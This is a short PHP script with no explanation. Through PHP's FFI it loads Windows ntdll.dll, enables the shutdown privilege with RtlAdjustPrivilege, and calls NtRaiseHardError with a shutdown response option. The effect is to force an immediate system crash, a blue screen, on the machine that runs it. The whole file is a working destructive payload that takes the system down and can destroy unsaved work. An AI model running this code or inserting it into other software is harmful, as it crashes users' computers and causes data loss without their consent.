<?php

$ffi = FFI::cdef("
    int RtlAdjustPrivilege(unsigned int Privilege, unsigned char Enable, unsigned char CurrentThread, unsigned char* Enabled);
    int NtRaiseHardError(unsigned int ErrorStatus, unsigned int NumberOfParameters, unsigned int UnicodeStringParameterMask, void* Parameters, unsigned int ValidResponseOptions, unsigned int* Response);
", "ntdll.dll");

$enabled = FFI::new("unsigned char");
$response = FFI::new("unsigned int");

$ffi->RtlAdjustPrivilege(19, 1, 0, FFI::addr($enabled));
$ffi->NtRaiseHardError(0xC0000420, 0, 0, null, 6, FFI::addr($response));

